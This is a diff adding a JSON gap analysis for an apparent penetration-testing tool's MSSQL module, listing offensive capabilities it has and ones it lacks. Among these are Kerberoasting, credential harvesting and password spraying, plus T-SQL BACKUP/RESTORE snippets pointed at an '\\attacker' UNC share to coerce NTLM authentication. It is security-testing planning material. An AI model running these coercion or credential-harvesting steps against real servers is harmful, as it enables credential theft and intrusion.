@@ -1,0 +1,280 @@
+{
+  "service": "mssql",
+  "module_files": [
+    "recce/services/db/mssql.py"
+  ],
+  "summary": "recce/services/db/mssql.py is a mature MSSQL module: SQL Browser UDP 1434 enum, native TDS pre-login (version + ENCRYPT posture), native TDS-over-TLS SQL-Auth login + weak-sa sweep, native LOGIN7-with-NTLM-Type1 pre-auth NTLM info leak, impacket-mssqlclient-driven deep enum (logins/dbs/TRUSTWORTHY/linked servers/impersonate/dangerous server perms/public grants/hashes/credentials/proxies/linkedlogins/startup procs/impersonate_chain/OPENROWSET(BULK) file read), recursive linked-server BFS with EXEC(...)AT-nested payloads, RCE via xp_cmdshell/OLE/SQL Agent (+CLR handoff), datamine (schemas + sensitive column heuristics), perm-mine (guest, public GRANTs), reversible write+role-toggle proof, xp_dirtree UNC coercion for NTLM relay, and relay-target discovery. Gaps are (a) alternate protocol primitives MS-TDS supports but recce doesn't drive (ADSI/OPENROWSET-provider ad-hoc queries, BACKUP-TO-UNC coercion, sp_execute_external_script / PolyBase RCE, contained-DB auth, DAC, TDS 8.0, replication-log secrets), (b) auth-layer weaknesses not tested (Kerberoast MSSQLSvc SPNs, NTLM-only mech advertisement, TLS certificate posture, Windows-auth spray, CVE-mapping by build), and (c) cross-service wiring \u2014 the module already learns NetBIOS/DNS names, sql_logins hashes, credential_identity accounts, linked-server hostnames, and cracked default creds but does not emit them into known_hostnames / known_domains / known_users / known_hashes / relay_targets / creds stores.",
+  "existing_capabilities": [
+    "sql_browser_udp_1434",
+    "tds_prelogin_version_and_encryption",
+    "native_tds_tls_sqlauth_login",
+    "weak_sa_default_sweep",
+    "pre_auth_ntlm_info_leak_via_login7_sspi",
+    "nmap_ms_sql_script_parsing",
+    "nxc_mssql_access_privilege_matrix",
+    "impacket_mssqlclient_deep_enum",
+    "server_principals_enum",
+    "trustworthy_db_enum",
+    "linked_server_enum_and_bfs_walk",
+    "impersonate_grant_enum",
+    "impersonate_multihop_chain_resolver",
+    "dangerous_server_permission_enum",
+    "public_role_server_grant_enum",
+    "sql_logins_hash_dump",
+    "stored_credentials_and_agent_proxies_enum",
+    "linked_logins_fixed_mapping_enum",
+    "startup_proc_enum",
+    "openrowset_bulk_file_read_confirm",
+    "xp_cmdshell_rce",
+    "ole_automation_rce",
+    "sql_agent_cmdexec_rce",
+    "clr_rce_handoff",
+    "datamine_tables_and_sensitive_columns",
+    "guest_and_public_object_perm_mine",
+    "reversible_write_and_role_toggle_proof",
+    "xp_dirtree_unc_coercion_for_relay",
+    "relay_target_discovery_ldap_mssql_smb",
+    "eol_version_flag"
+  ],
+  "missing_capabilities": [
+    {
+      "name": "kerberoast_mssqlsvc_spn",
+      "kind": "active",
+      "description": "MSSQL under Windows auth registers MSSQLSvc/<fqdn>:<port|instance> SPNs (MS-KILE / MSDN 'Register a Service Principal Name'). Any domain user can request a TGS for MSSQLSvc/* and crack it offline (hashcat -m 13100). recce enumerates the FQDN pre-auth via the LOGIN7 NTLM leak (nb_computer/dns_computer already parsed) but never emits a kerberoast target or a Rubeus/GetUserSPNs runbook \u2014 a nearly-free service-account credential path on any AD-integrated instance.",
+      "value": "high",
+      "protocol_reference": "MS-KILE \u00a73.3.5.6.1; TDS \u00a72.2.6.4 SSPI negotiation (SPN target)",
+      "cwe": [
+        "CWE-262"
+      ],
+      "finding_kind": "mssql_kerberoastable_spn"
+    },
+    {
+      "name": "backup_to_unc_coercion",
+      "kind": "active",
+      "description": "Alternate NetNTLM coercion that xp_dirtree covers today: `BACKUP DATABASE master TO DISK='\\\\attacker\\x\\z.bak' WITH INIT` and `RESTORE VERIFYONLY FROM DISK='\\\\attacker\\x\\z'`. Also `sp_helpfile`, `sp_certify_removable`, `xp_fileexist '\\\\a\\x'`, and `BULK INSERT ... FROM '\\\\a\\x'` reach out over SMB. Some environments monitor xp_dirtree but not BACKUP \u2014 a low-priv login only needs BACKUP DATABASE, no xp_ privileges. Belongs alongside relay_finding.",
+      "value": "high",
+      "protocol_reference": "T-SQL BACKUP/RESTORE reference; TDS \u00a72.2.7.6",
+      "cwe": [
+        "CWE-918",
+        "CWE-522"
+      ],
+      "finding_kind": "mssql_backup_unc_coercion"
+    },
+    {
+      "name": "sp_execute_external_script_rce",
+      "kind": "active",
+      "description": "Machine Learning Services (SQL 2017+) exposes `sp_execute_external_script @language=N'Python'|N'R', @script=N'...'` \u2014 a full Python/R interpreter running as `MSSQLLaunchpad` (typically LocalSystem-equivalent on default install) that bypasses xp_cmdshell audit and produces file/network I/O. Only needs `EXECUTE ANY EXTERNAL SCRIPT` (grantable outside sysadmin). recce enumerates 'xp_cmdshell','Ole Automation Procedures','clr enabled' but not 'external scripts enabled' or the language-list `sys.external_languages`.",
+      "value": "high",
+      "protocol_reference": "MSSQL BOL sp_execute_external_script; SQL Server 2019 external language docs",
+      "cwe": [
+        "CWE-77",
+        "CWE-250"
+      ],
+      "finding_kind": "mssql_external_script_rce"
+    },
+    {
+      "name": "adsi_linkedserver_ldap_plaintext_capture",
+      "kind": "active",
+      "description": "Adding a linked server with `sp_addlinkedserver 'ROGUE','ADSI'` and `sp_addlinkedsrvlogin ... 'rmtuser','password'`, then `OPENQUERY(ROGUE,'<ADSI>')` causes SQL to LDAP-SIMPLE-BIND to attacker LDAP with the fixed remote password in cleartext (SharpSQLShell / MSSQLPwner primitive). recce enumerates linked-logins but never abuses ADSI provider registration to harvest plaintext linked-server credentials.",
+      "value": "high",
+      "protocol_reference": "OLE DB ADSI provider; sp_addlinkedserver reference",
+      "cwe": [
+        "CWE-319",
+        "CWE-522"
+      ],
+      "finding_kind": "mssql_adsi_provider_cred_capture"
+    },
+    {
+      "name": "contained_database_auth",
+      "kind": "auth",
+      "description": "SQL 2012+ supports contained databases (`sp_configure 'contained database authentication',1;` + `ALTER DATABASE ... SET CONTAINMENT = PARTIAL`) with CREATE USER ... WITH PASSWORD \u2014 users authenticate directly against the database, bypassing sys.server_principals. There's no `sa` on a contained DB, and every contained user's login page is separately sprayable. recce's enum never queries `sys.databases.containment` / `sys.database_principals WHERE authentication_type=2`, and weak_sa_sweep only sprays the master DB context.",
+      "value": "medium",
+      "protocol_reference": "TDS \u00a72.2.6.4 (Database in LOGIN7); MSDN 'Contained Databases'",
+      "cwe": [
+        "CWE-522",
+        "CWE-287"
+      ],
+      "finding_kind": "mssql_contained_db_users"
+    },
+    {
+      "name": "replication_and_agent_secrets",
+      "kind": "active",
+      "description": "When Replication is configured, msdb + distribution DB hold `MSmerge_password_history`, `MSpublications.publisher_password`, `MSsubscription_properties.subscriber_password`, `syssubscriptions` etc. (RC4-encrypted with SMK, decryptable by sysadmin). Similarly `msdb.dbo.syscachedcredentials`, `msdb.dbo.sysjobsteps` (T-SQL body with hardcoded connection strings), and `sys.symmetric_keys`/`sys.certificates`. recce reads sys.credentials and sysproxies but not replication tables or job-step bodies \u2014 very often where estate service passwords hide.",
+      "value": "high",
+      "protocol_reference": "SQL Server Replication BOL; sysjobsteps schema",
+      "cwe": [
+        "CWE-522",
+        "CWE-257"
+      ],
+      "finding_kind": "mssql_replication_secrets"
+    },
+    {
+      "name": "dac_dedicated_admin_connection",
+      "kind": "active",
+      "description": "SQL Server exposes the Dedicated Admin Connection on TCP 1434 (or a dynamic port advertised in the Browser response as `DAC=...`) for sysadmin-only diagnostics; DAC bypasses normal LOGIN concurrency limits and often has looser network exposure. recce parses `tcp`/`np`/`isclustered` from the Browser payload but drops the DAC advertisement, and never probes 1434/TCP.",
+      "value": "medium",
+      "protocol_reference": "MS-TDS \u00a72.2.6.4; SQL Server Browser DAC advertisement",
+      "cwe": [
+        "CWE-306"
+      ],
+      "finding_kind": "mssql_dac_exposed"
+    },
+    {
+      "name": "tds8_strict_encryption_and_downgrade",
+      "kind": "passive",
+      "description": "SQL Server 2022 introduced TDS 8.0 (TLS-first, no PRELOGIN in cleartext). recce's prelogin still sends TDSVersion 7.4 (0x74000004) and never probes for TDS 8.0 (`Encryption byte 0x03 STRICT` + ALPN 'tds/8.0'). Missing TDS 8.0 support means (a) the module doesn't flag servers that fail to require STRICT (a hardening posture gap) and (b) doesn't detect the reverse \u2014 a client-side downgrade opportunity where a modern server still accepts TDS 7.4 without STRICT.",
+      "value": "medium",
+      "protocol_reference": "MS-TDS Rev 2022 \u00a72.2.6.5 (TDS 8.0 Encryption)",
+      "cwe": [
+        "CWE-757"
+      ],
+      "finding_kind": "mssql_tds8_downgrade"
+    },
+    {
+      "name": "tls_certificate_posture",
+      "kind": "passive",
+      "description": "recce's TLS-over-TDS handshake uses `ssl._create_unverified_context()` and discards the server cert. The cert itself is high-value evidence: self-signed = MITM viable against Force-Encryption; SAN/CN discloses hostnames/FQDN aliases (feed known_hostnames); short RSA keys / SHA-1 signatures are audit findings; expiry flags a maintenance gap. Impacket's mssqlclient does not surface this either.",
+      "value": "medium",
+      "protocol_reference": "MS-TDS \u00a72.2.6.5 PRELOGIN ENCRYPTION token",
+      "cwe": [
+        "CWE-295",
+        "CWE-326"
+      ],
+      "finding_kind": "mssql_tls_cert_weak"
+    },
+    {
+      "name": "sqlauth_password_spray_domain_and_wordlist",
+      "kind": "active",
+      "description": "`weak_sa_sweep` only tries 7 baked defaults and only against `sa`. There is no per-login spray against the enumerated `sys.server_principals` names, no Windows-auth spray (NTLM Type-3 built from a supplied hash/password over the LOGIN7 SSPI slot already implemented for Type-1), and no wordlist-driven password spray across the login list \u2014 despite `wordlist` being a documented parameter today used only as extra `sa:...` pairs.",
+      "value": "high",
+      "protocol_reference": "MS-TDS \u00a72.2.6.4 LOGIN7",
+      "cwe": [
+        "CWE-521",
+        "CWE-307"
+      ],
+      "finding_kind": "mssql_login_sprayable"
+    },
+    {
+      "name": "cve_mapping_by_build",
+      "kind": "passive",
+      "description": "Prelogin returns `version=major.minor.build` and the module maps only major->marketing name + a single 'EoL if major<=12' flag. There is no lookup against known SQL Server CVEs \u2014 e.g. CVE-2020-0618 (Reporting Services deserialization RCE), CVE-2020-1044 (SNAC), CVE-2021-1636 (EoP), CVE-2022-29141 (EoP), CVE-2023-21528 / CVE-2023-36730 (RCE via Native Scoring / OLE DB provider), CVE-2024-21308/-21378 (SQL Server ODBC RCE). Build->CU->CVE mapping is a table lookup, entirely offline.",
+      "value": "high",
+      "protocol_reference": "Microsoft Security Update Guide; SQL Server build-to-CU/GDR list",
+      "cwe": [
+        "CWE-1035"
+      ],
+      "finding_kind": "mssql_known_cve"
+    },
+    {
+      "name": "ntlm_only_mechlist_downgrade",
+      "kind": "auth",
+      "description": "SQL Server can accept RAW NTLM in the LOGIN7 SSPI slot even when the AD environment has Kerberos-only enforcement expected \u2014 an NTLM-only mechlist is a hardening finding (blocks EPA/channel-binding enforcement in some paths and is a relay target). recce sends Type-1 for the pre-auth leak but never inspects the negotiated mechlist / whether the server accepted a Type-3 with fInt-only when RESTRICT-NTLM should have blocked it.",
+      "value": "medium",
+      "protocol_reference": "MS-NLMP; MS-TDS \u00a72.2.6.4 SSPI slot",
+      "cwe": [
+        "CWE-757"
+      ],
+      "finding_kind": "mssql_ntlm_downgrade"
+    },
+    {
+      "name": "xp_regread_registry_read",
+      "kind": "active",
+      "description": "`xp_regread`/`xp_instance_regread` under sysadmin read arbitrary HKLM keys (e.g. `HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\<Instance>\\Setup\\SQLServiceAccount`, `HKLM\\SYSTEM\\CurrentControlSet\\Services\\MSSQL*\\ObjectName`, `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa`). This yields the SQL service account name (feed known_users), SQL Setup passwords cached in registry, and telemetry defensive-tool discovery \u2014 no OS shell needed and often unlogged. Not currently exercised.",
+      "value": "medium",
+      "protocol_reference": "MSSQL BOL xp_regread; MS-TDS RPC",
+      "cwe": [
+        "CWE-732",
+        "CWE-200"
+      ],
+      "finding_kind": "mssql_registry_read"
+    },
+    {
+      "name": "extended_stored_proc_load_dll",
+      "kind": "active",
+      "description": "`sp_addextendedproc` (2000/2005 semantics preserved) and CLR `CREATE ASSEMBLY ... FROM 0x...` with `PERMISSION_SET = UNSAFE` load an arbitrary DLL/assembly path (UNC-reachable) into sqlservr.exe. recce hands CLR execution off to mssqlpwner but never actually issues `CREATE ASSEMBLY` itself or verifies the estate has `TRUSTWORTHY` + `UNSAFE ASSEMBLY` granted to non-sysadmins \u2014 a common misconfig that turns db_owner into in-process code execution without touching xp_cmdshell.",
+      "value": "medium",
+      "protocol_reference": "T-SQL CREATE ASSEMBLY; sp_addextendedproc",
+      "cwe": [
+        "CWE-250",
+        "CWE-427"
+      ],
+      "finding_kind": "mssql_clr_unsafe_asm_capability"
+    },
+    {
+      "name": "polybase_and_external_data_source",
+      "kind": "active",
+      "description": "PolyBase (`sp_configure 'polybase enabled',1`) + `CREATE EXTERNAL DATA SOURCE` + `CREATE EXTERNAL TABLE` opens outbound HDFS/JDBC/ODBC/Blob connections carrying stored `DATABASE SCOPED CREDENTIAL` secrets and can SSRF/coerce. `sys.external_data_sources` + `sys.database_scoped_credentials` enumerate this trivially, entirely missed today.",
+      "value": "medium",
+      "protocol_reference": "PolyBase T-SQL reference; sys.external_* views",
+      "cwe": [
+        "CWE-918",
+        "CWE-522"
+      ],
+      "finding_kind": "mssql_polybase_configured"
+    },
+    {
+      "name": "always_encrypted_and_tde_posture",
+      "kind": "passive",
+      "description": "`sys.column_master_keys`, `sys.column_encryption_keys`, and `sys.dm_database_encryption_keys` reveal Always Encrypted / TDE posture. Missing here means the sensitive-columns finding (`data_at_rest`) doesn't distinguish 'sensitive column, unencrypted' from 'sensitive column, AE-protected' \u2014 a materially different impact/priority signal.",
+      "value": "low",
+      "protocol_reference": "MSSQL BOL Always Encrypted / TDE",
+      "cwe": [
+        "CWE-311"
+      ],
+      "finding_kind": "mssql_data_unencrypted_at_rest"
+    },
+    {
+      "name": "ssrs_reporting_services_detection",
+      "kind": "passive",
+      "description": "Reporting Services is co-installed on many MSSQL hosts (TCP 80/443/8080/`/ReportServer`, `/Reports`) \u2014 CVE-2020-0618 (SOAP deserialization RCE, ViewState) is the classic quick win. Currently no linkage from `is_mssql` \u2192 'check /ReportServer on the same host' cross-service pivot.",
+      "value": "medium",
+      "protocol_reference": "SSRS Report Server Web Service; MS16-004 style advisories",
+      "cwe": [
+        "CWE-502"
+      ],
+      "finding_kind": "mssql_ssrs_reachable"
+    },
+    {
+      "name": "sql_broker_dialogs",
+      "kind": "active",
+      "description": "Service Broker (`sys.service_queues`, `sys.routes`, `sys.remote_service_bindings`) is a message-queue lateral primitive \u2014 an inbound BEGIN DIALOG or an outbound route to another instance can trigger deferred T-SQL under a stored user context. Not enumerated.",
+      "value": "low",
+      "protocol_reference": "MSSQL BOL Service Broker",
+      "cwe": [
+        "CWE-284"
+      ],
+      "finding_kind": "mssql_service_broker_topology"
+    },
+    {
+      "name": "audit_and_defensive_posture",
+      "kind": "passive",
+      "description": "`sys.server_audits`/`sys.server_audit_specifications`/`sys.dm_server_audit_status`, `sys.traces`, `fn_get_audit_file`, xEvent sessions \u2014 recce doesn't check whether auditing is disabled. A modified `RUNNING=0` audit is a persistence/anti-forensics finding; historical traces are a treasure of past queries + literal-embedded passwords.",
+      "value": "low",
+      "protocol_reference": "MSSQL BOL SQL Server Audit",
+      "cwe": [
+        "CWE-778"
+      ],
+      "finding_kind": "mssql_audit_disabled"
+    }
+  ],
+  "priority_gaps": [
+    "kerberoast_mssqlsvc_spn \u2014 nearly free credential path for AD-integrated instances, FQDN already known pre-auth",
+    "backup_to_unc_coercion + xp_fileexist / xp_subdirs \u2014 silent NTLM coercion alternatives to xp_dirtree that a low-priv login with only BACKUP DATABASE can trigger",
+    "sp_execute_external_script + polybase \u2014 modern RCE primitives that bypass the xp_cmdshell/OLE/Agent triad the module tests today",
+    "cve_mapping_by_build \u2014 the prelogin already extracts an exact build, but nothing maps it to CVE-2020-0618/2023-36730/etc., a big offline-only win",
+    "cross_service_emission \u2014 the module already learns nb/dns/FQDN, sql_logins hashes, linked-server hostnames, credential_identity accounts, and cracked SA creds but never emits them to known_hostnames/known_domains/known_users/known_hashes/relay_targets/creds stores"
+  ],
+  "cross_service_wire_gaps": [
+    "ntlm_info() parses nb_domain / nb_computer / dns_computer / dns_domain / dns_tree / os_version but never feeds known_hostnames / known_domains \u2014 those names are canonical hostnames/domain identifiers other modules should share",
+    "enum 'logins' rows (sys.server_principals type S/U/G) are SQL logins + Windows/domain principals but are not emitted to known_users \u2014 a Kerberos/kerberoast/spray input for other modules",
+    "enum 'hashes' dumps sys.sql_logins password_hash values but does not push them into known_hashes as hashcat -m 1731 records \u2014 they die inside the finding text",
+    "enum 'credentials' + 'proxies' surface `credential_identity` \u2014 often DOMAIN\\svc_* accounts \u2014 with no emission to known_users (or domain discovery)",
+    "enum 'linkedlogins' + 'links' enumerate other MSSQL server hostnames/data_source strings that never reach known_hostnames or the mssql_targets/relay_targets pool for pivoting",
+    "weak_sa_sweep hits produce a working (user,password) credential that is never planted in the shared creds store \u2014 the same password very often works elsewhere and no other service module gets to try it",
+    "run_xp_dirtree returns success but does not register the SQL service account (learned once xp_cmdshell 'whoami' runs) as a discovered user / relay identity",
+    "link_findings walks remote servers and learns their @@SERVERNAME and effective login on each hop \u2014 none of it feeds known_hostnames or known_users",
+    "TLS cert (currently discarded) SAN/CN would populate known_hostnames with additional aliases",
+    "SQL Browser response fields `np` (named pipe path \\\\HOST\\pipe\\...) name a NetBIOS host that is not fed to known_hostnames"
+  ],
+  "notes": "Skipped as cosmetic or already covered: SPN version fingerprint text refinement, adding more marketing-name buckets, additional _WEAK_MSSQL_CREDS entries. Focus is on protocol-level primitives (Kerberos SPN, external scripts, PolyBase, ADSI provider, contained DBs, replication secrets, BACKUP-to-UNC, DAC, TDS 8.0, TLS cert), on the login/spray gap the wordlist plumbing already asks for, on version->CVE mapping, and on the cross-service emission gap where the module clearly learns facts (hostnames/hashes/users/creds/linked topology) that other recce stores would consume but currently do not receive."
+}
